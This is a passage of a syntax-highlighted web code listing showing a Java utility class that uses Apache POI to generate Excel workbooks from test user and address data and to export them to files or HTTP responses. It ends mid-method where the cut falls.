class="line">829</span><br><span class="line">830</span><br><span class="line">831</span><br><span class="line">832</span><br><span class="line">833</span><br><span class="line">834</span><br><span class="line">835</span><br><span class="line">836</span><br><span class="line">837</span><br><span class="line">838</span><br><span class="line">839</span><br><span class="line">840</span><br><span class="line">841</span><br><span class="line">842</span><br><span class="line">843</span><br><span class="line">844</span><br><span class="line">845</span><br><span class="line">846</span><br><span class="line">847</span><br><span class="line">848</span><br><span class="line">849</span><br><span class="line">850</span><br><span class="line">851</span><br><span class="line">852</span><br><span class="line">853</span><br><span class="line">854</span><br><span class="line">855</span><br><span class="line">856</span><br><span class="line">857</span><br><span class="line">858</span><br><span class="line">859</span><br><span class="line">860</span><br><span class="line">861</span><br><span class="line">862</span><br><span class="line">863</span><br><span class="line">864</span><br><span class="line">865</span><br><span class="line">866</span><br><span class="line">867</span><br><span class="line">868</span><br><span class="line">869</span><br><span class="line">870</span><br><span class="line">871</span><br><span class="line">872</span><br><span class="line">873</span><br><span class="line">874</span><br><span class="line">875</span><br><span class="line">876</span><br><span class="line">877</span><br><span class="line">878</span><br><span class="line">879</span><br><span class="line">880</span><br><span class="line">881</span><br><span class="line">882</span><br><span class="line">883</span><br><span class="line">884</span><br><span class="line">885</span><br><span class="line">886</span><br><span class="line">887</span><br><span class="line">888</span><br><span class="line">889</span><br><span class="line">890</span><br><span class="line">891</span><br><span class="line">892</span><br><span class="line">893</span><br><span class="line">894</span><br><span class="line">895</span><br><span class="line">896</span><br><span class="line">897</span><br><span class="line">898</span><br><span class="line">899</span><br><span class="line">900</span><br><span class="line">901</span><br><span class="line">902</span><br><span class="line">903</span><br><span class="line">904</span><br><span class="line">905</span><br><span class="line">906</span><br><span class="line">907</span><br><span class="line">908</span><br><span class="line">909</span><br><span class="line">910</span><br><span class="line">911</span><br><span class="line">912</span><br><span class="line">913</span><br><span class="line">914</span><br><span class="line">915</span><br><span class="line">916</span><br><span class="line">917</span><br><span class="line">918</span><br><span class="line">919</span><br><span class="line">920</span><br><span class="line">921</span><br><span class="line">922</span><br><span class="line">923</span><br><span class="line">924</span><br><span class="line">925</span><br><span class="line">926</span><br><span class="line">927</span><br><span class="line">928</span><br><span class="line">929</span><br><span class="line">930</span><br><span class="line">931</span><br><span class="line">932</span><br><span class="line">933</span><br><span class="line">934</span><br><span class="line">935</span><br><span class="line">936</span><br><span class="line">937</span><br><span class="line">938</span><br><span class="line">939</span><br><span class="line">940</span><br><span class="line">941</span><br><span class="line">942</span><br><span class="line">943</span><br><span class="line">944</span><br><span class="line">945</span><br><span class="line">946</span><br><span class="line">947</span><br><span class="line">948</span><br><span class="line">949</span><br><span class="line">950</span><br><span class="line">951</span><br><span class="line">952</span><br><span class="line">953</span><br><span class="line">954</span><br><span class="line">955</span><br><span class="line">956</span><br><span class="line">957</span><br><span class="line">958</span><br><span class="line">959</span><br><span class="line">960</span><br><span class="line">961</span><br><span class="line">962</span><br><span class="line">963</span><br><span class="line">964</span><br><span class="line">965</span><br><span class="line">966</span><br><span class="line">967</span><br><span class="line">968</span><br><span class="line">969</span><br><span class="line">970</span><br><span class="line">971</span><br><span class="line">972</span><br><span class="line">973</span><br><span class="line">974</span><br><span class="line">975</span><br><span class="line">976</span><br><span class="line">977</span><br><span class="line">978</span><br><span class="line">979</span><br><span class="line">980</span><br><span class="line">981</span><br><span class="line">982</span><br><span class="line">983</span><br><span class="line">984</span><br><span class="line">985</span><br><span class="line">986</span><br><span class="line">987</span><br><span class="line">988</span><br><span class="line">989</span><br><span class="line">990</span><br><span class="line">991</span><br><span class="line">992</span><br><span class="line">993</span><br><span class="line">994</span><br><span class="line">995</span><br><span class="line">996</span><br><span class="line">997</span><br><span class="line">998</span><br><span class="line">999</span><br><span class="line">1000</span><br><span class="line">1001</span><br><span class="line">1002</span><br><span class="line">1003</span><br><span class="line">1004</span><br><span class="line">1005</span><br><span class="line">1006</span><br><span class="line">1007</span><br><span class="line">1008</span><br><span class="line">1009</span><br><span class="line">1010</span><br><span class="line">1011</span><br><span class="line">1012</span><br><span class="line">1013</span><br><span class="line">1014</span><br><span class="line">1015</span><br><span class="line">1016</span><br><span class="line">1017</span><br><span class="line">1018</span><br><span class="line">1019</span><br><span class="line">1020</span><br><span class="line">1021</span><br><span class="line">1022</span><br><span class="line">1023</span><br><span class="line">1024</span><br><span class="line">1025</span><br><span class="line">1026</span><br><span class="line">1027</span><br><span class="line">1028</span><br><span class="line">1029</span><br><span class="line">1030</span><br><span class="line">1031</span><br><span class="line">1032</span><br><span class="line">1033</span><br><span class="line">1034</span><br><span class="line">1035</span><br><span class="line">1036</span><br><span class="line">1037</span><br><span class="line">1038</span><br><span class="line">1039</span><br><span class="line">1040</span><br><span class="line">1041</span><br><span class="line">1042</span><br><span class="line">1043</span><br><span class="line">1044</span><br><span class="line">1045</span><br><span class="line">1046</span><br><span class="line">1047</span><br><span class="line">1048</span><br><span class="line">1049</span><br><span class="line">1050</span><br><span class="line">1051</span><br><span class="line">1052</span><br><span class="line">1053</span><br><span class="line">1054</span><br><span class="line">1055</span><br><span class="line">1056</span><br><span class="line">1057</span><br><span class="line">1058</span><br><span class="line">1059</span><br><span class="line">1060</span><br><span class="line">1061</span><br><span class="line">1062</span><br><span class="line">1063</span><br><span class="line">1064</span><br><span class="line">1065</span><br><span class="line">1066</span><br><span class="line">1067</span><br><span class="line">1068</span><br><span class="line">1069</span><br><span class="line">1070</span><br><span class="line">1071</span><br><span class="line">1072</span><br><span class="line">1073</span><br><span class="line">1074</span><br><span class="line">1075</span><br><span class="line">1076</span><br><span class="line">1077</span><br><span class="line">1078</span><br><span class="line">1079</span><br><span class="line">1080</span><br><span class="line">1081</span><br><span class="line">1082</span><br><span class="line">1083</span><br><span class="line">1084</span><br><span class="line">1085</span><br><span class="line">1086</span><br><span class="line">1087</span><br><span class="line">1088</span><br><span class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.psds.credit.admin.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.psds.credit.admin.entity.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.hssf.usermodel.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.hssf.util.HSSFColor;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.ss.usermodel.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.poi.xssf.usermodel.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Iterator;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExcelExportUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 导出Excel</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sheetName       表格 sheet 的名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> headers         标题名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> dataList        需要显示的数据集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> exportExcelName 导出excel文件的名字</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exportExcel</span><span class="params">(String sheetName, List&lt;Map&lt;String, Object&gt;&gt; dataList,</span></span></span><br><span class="line"><span class="function"><span class="params">                            String[] headers, String exportExcelName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 声明一个工作薄</span></span><br><span class="line">        XSSFWorkbook workbook = <span class="keyword">new</span> XSSFWorkbook();</span><br><span class="line">        <span class="comment">// 生成一个表格</span></span><br><span class="line">        XSSFSheet sheet = workbook.createSheet(sheetName);</span><br><span class="line">        <span class="comment">// 设置表格默认列宽度为15个字节</span></span><br><span class="line">        sheet.setDefaultColumnWidth(<span class="number">15</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 生成表格中非标题栏的样式</span></span><br><span class="line">        XSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">        <span class="comment">// 设置这些样式</span></span><br><span class="line">        style.setFillForegroundColor(HSSFColor.HSSFColorPredefined.WHITE.getIndex());<span class="comment">//背景色</span></span><br><span class="line">        style.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line">        style.setBorderBottom(BorderStyle.THIN);</span><br><span class="line">        style.setBorderLeft(BorderStyle.THIN);</span><br><span class="line">        style.setBorderRight(BorderStyle.THIN);</span><br><span class="line">        style.setBorderTop(BorderStyle.THIN);</span><br><span class="line">        style.setAlignment(HorizontalAlignment.CENTER);</span><br><span class="line">        <span class="comment">// 生成表格中非标题栏的字体</span></span><br><span class="line">        XSSFFont font = workbook.createFont();</span><br><span class="line">        font.setColor(HSSFColor.HSSFColorPredefined.BLACK.getIndex());</span><br><span class="line">        font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">12</span>);</span><br><span class="line">        font.setBold(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 把字体应用到当前的样式</span></span><br><span class="line">        style.setFont(font);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置表格标题栏的样式</span></span><br><span class="line">        XSSFCellStyle titleStyle = workbook.createCellStyle();</span><br><span class="line">        titleStyle.setFillForegroundColor(HSSFColor.HSSFColorPredefined.BLUE_GREY.getIndex());</span><br><span class="line">        titleStyle.setFillPattern(FillPatternType.SOLID_FOREGROUND);</span><br><span class="line">        titleStyle.setBorderBottom(BorderStyle.THIN);</span><br><span class="line">        titleStyle.setBorderLeft(BorderStyle.THIN);</span><br><span class="line">        titleStyle.setBorderRight(BorderStyle.THIN);</span><br><span class="line">        titleStyle.setBorderTop(BorderStyle.THIN);</span><br><span class="line">        titleStyle.setAlignment(HorizontalAlignment.CENTER);</span><br><span class="line">        titleStyle.setVerticalAlignment(VerticalAlignment.CENTER);</span><br><span class="line">        <span class="comment">// 设置标题栏字体</span></span><br><span class="line">        XSSFFont titleFont = workbook.createFont();</span><br><span class="line">        titleFont.setColor(HSSFColor.HSSFColorPredefined.WHITE.getIndex());</span><br><span class="line">        titleFont.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">12</span>);</span><br><span class="line">        titleFont.setBold(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 把字体应用到当前的样式</span></span><br><span class="line">        titleStyle.setFont(titleFont);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 产生表格标题行</span></span><br><span class="line">        XSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">short</span> i = <span class="number">0</span>; i &lt; headers.length; i++) &#123;</span><br><span class="line">            XSSFCell cell = row.createCell(i);</span><br><span class="line">            cell.setCellStyle(titleStyle);</span><br><span class="line">            XSSFRichTextString text = <span class="keyword">new</span> XSSFRichTextString(headers[i]);</span><br><span class="line">            cell.setCellValue(text);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历集合数据，产生数据行</span></span><br><span class="line">        Iterator&lt;Map&lt;String, Object&gt;&gt; it = dataList.iterator();</span><br><span class="line">        <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (it.hasNext()) &#123;</span><br><span class="line">            index++;</span><br><span class="line">            row = sheet.createRow(index);</span><br><span class="line">            Map&lt;String, Object&gt; data = it.next();</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (String key : data.keySet()) &#123;</span><br><span class="line">                XSSFCell cell = row.createCell(i);</span><br><span class="line">                cell.setCellStyle(style);</span><br><span class="line">                XSSFRichTextString text = <span class="keyword">new</span> XSSFRichTextString(data.get(key) + <span class="string">&quot;&quot;</span>);</span><br><span class="line">                cell.setCellValue(text);</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        OutputStream out = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String tmpPath = <span class="string">&quot;C:\\excel\\&quot;</span> + exportExcelName + <span class="string">&quot;.xlsx&quot;</span>;</span><br><span class="line">            out = <span class="keyword">new</span> FileOutputStream(tmpPath);</span><br><span class="line">            workbook.write(out);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (workbook != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    workbook.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (out != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建每个 sheet 页的数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">createSheetData</span><span class="params">(HSSFWorkbook aWorkbook, String[] aTitles, String aSheetName,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 List&lt;String[]&gt; aRowData)</span> </span>&#123;</span><br><span class="line">        HSSFSheet tmpSheet = aWorkbook.createSheet(aSheetName);</span><br><span class="line">        <span class="comment">// 设置sheet的标题</span></span><br><span class="line">        HSSFRow tmpTitileRow = tmpSheet.createRow(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; aTitles.length; i++) &#123;</span><br><span class="line">            tmpTitileRow.createCell(i).setCellValue(aTitles[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 遍历填充每行的数据</span></span><br><span class="line">        HSSFRow tmpRow = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">int</span> tmpRowNumber = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (String[] rowData : aRowData) &#123;</span><br><span class="line">            tmpRow = tmpSheet.createRow(tmpRowNumber);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rowData.length; i++) &#123;</span><br><span class="line">                tmpRow.createCell(i).setCellValue(rowData[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            tmpRowNumber++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 设置响应头</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">setResponseHeader</span><span class="params">(HttpServletResponse aResponse, String aFileName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                aFileName = <span class="keyword">new</span> String(aFileName.getBytes(), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (UnsupportedEncodingException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            aResponse.setContentType(<span class="string">&quot;application/octet-stream;charset=UTF-8&quot;</span>);</span><br><span class="line">            aResponse.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;filename=&quot;</span> + aFileName);</span><br><span class="line">            aResponse.addHeader(<span class="string">&quot;Pargam&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">            aResponse.addHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过页面导出</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> aResponse</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">export</span><span class="params">(HttpServletResponse aResponse)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        HSSFWorkbook tmpWorkbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">        String[] tmpUserTitles = &#123;<span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;年龄&quot;</span>, <span class="string">&quot;工作&quot;</span>&#125;;</span><br><span class="line">        aResponse.setHeader(<span class="string">&quot;content-type&quot;</span>, <span class="string">&quot;text/xls;charset=UTF-8&quot;</span>);</span><br><span class="line">        aResponse.setHeader(<span class="string">&quot;Content-disposition&quot;</span>, String.format(<span class="string">&quot;attachment; filename=\&quot;%s\&quot;&quot;</span>, <span class="string">&quot;用户信息表_&quot;</span> + System.currentTimeMillis() + <span class="string">&quot;.xls&quot;</span>));</span><br><span class="line">        aResponse.setHeader(<span class="string">&quot;Pragma&quot;</span>, <span class="string">&quot;No-cache&quot;</span>);<span class="comment">//设置响应头信息，告诉浏览器不要缓存此内容</span></span><br><span class="line">        aResponse.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">        aResponse.setDateHeader(<span class="string">&quot;Expire&quot;</span>, <span class="number">0</span>);</span><br><span class="line">        List&lt;String[]&gt; tmpUsers = getUsers();</span><br><span class="line">        createSheetData(tmpWorkbook, tmpUserTitles, <span class="string">&quot;用户信息&quot;</span>, tmpUsers);</span><br><span class="line"><span class="comment">//        setResponseHeader(aResponse, &quot;用户信息表.xls&quot;);</span></span><br><span class="line">        OutputStream tmpOutputStream = aResponse.getOutputStream();</span><br><span class="line">        tmpWorkbook.write(tmpOutputStream);</span><br><span class="line">        tmpOutputStream.flush();</span><br><span class="line">        tmpOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 导出，不通过页面导出</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">export</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        HSSFWorkbook tmpWorkbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">        String[] tmpUserTitles = &#123;<span class="string">&quot;姓名&quot;</span>, <span class="string">&quot;性别&quot;</span>, <span class="string">&quot;年龄&quot;</span>, <span class="string">&quot;工作&quot;</span>&#125;;</span><br><span class="line">        List&lt;String[]&gt; tmpUsers = getUsers();</span><br><span class="line">        createSheetData(tmpWorkbook, tmpUserTitles, <span class="string">&quot;用户信息&quot;</span>, tmpUsers);</span><br><span class="line">        String[] tmpAddressTitles = &#123;<span class="string">&quot;城市&quot;</span>, <span class="string">&quot;区域&quot;</span>&#125;;</span><br><span class="line">        List&lt;String[]&gt; getAddress = getAddress();</span><br><span class="line">        createSheetData(tmpWorkbook, tmpAddressTitles, <span class="string">&quot;地址信息&quot;</span>, getAddress);</span><br><span class="line">        OutputStream tmpOutputStream = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;C:\\&quot;</span> + System.currentTimeMillis() + <span class="string">&quot;.xls&quot;</span>);</span><br><span class="line">        tmpWorkbook.write(tmpOutputStream);</span><br><span class="line">        tmpOutputStream.flush();</span><br><span class="line">        tmpOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String[]&gt; getAddress() &#123;</span><br><span class="line">        List&lt;String[]&gt; address = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</span><br><span class="line">            String[] addr = <span class="keyword">new</span> String[<span class="number">2</span>];</span><br><span class="line">            addr[<span class="number">0</span>] = <span class="string">&quot;四川&quot;</span>;</span><br><span class="line">            addr[<span class="number">1</span>] = <span class="string">&quot;高新 - &quot;</span> + i;</span><br><span class="line">            address.add(addr);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String[]&gt; getUsers() &#123;</span><br><span class="line">        List&lt;String[]&gt; users = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">            String[] user = <span class="keyword">new</span> String[<span class="number">4</span>];</span><br><span class="line">            user[<span class="number">0</span>] = <span class="string">&quot;zhangsan - &quot;</span> + i;</span><br><span class="line">            user[<span class="number">1</span>] = <span class="string">&quot;男&quot;</span>;</span><br><span class="line">            user[<span class="number">2</span>] = <span class="string">&quot;2&quot;</span> + i;</span><br><span class="line">            user[<span class="number">3</span>] = <span class="string">&quot;Java - &quot;</span> + i;</span><br><span class="line">            users.add(user);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> users;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">createExcel</span><span class="params">(HttpServletResponse response, List&lt;TMonitorReport&gt; list)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;String&gt; title = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">            title.add(<span class="string">&quot;ent_cert_type&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;bank_uid&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;bank_social_no&quot;</span>);</span><br><span class="line">            title.add(<span class="string">&quot;bank_ent_name&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的工作书册 Workbook,对应到一个excel文档</span></span><br><span class="line">            HSSFWorkbook workbook = <span class="keyword">new</span> HSSFWorkbook();</span><br><span class="line">            HSSFCellStyle style = workbook.createCellStyle();</span><br><span class="line">            <span class="comment">// 生成一个字体</span></span><br><span class="line">            HSSFFont font = workbook.createFont();</span><br><span class="line">            <span class="comment">// 字体增粗</span></span><br><span class="line">            <span class="comment">//font.setBoldweight(HSSFFont.BOLDWEIGHT_BOLD);</span></span><br><span class="line">            font.setFontHeightInPoints((<span class="keyword">short</span>) <span class="number">11</span>);</span><br><span class="line">            style.setFont(font);</span><br><span class="line">            <span class="comment">// 创建Excel的工作sheet,对应到一个excel文档的tab</span></span><br><span class="line">            HSSFSheet sheet = workbook.createSheet(<span class="string">&quot;sheet1&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Excel的sheet的一行 (表头)</span></span><br><span class="line">            HSSFRow row = sheet.createRow(<span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 表头内容填充</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; title.size(); i++) &#123;</span><br><span 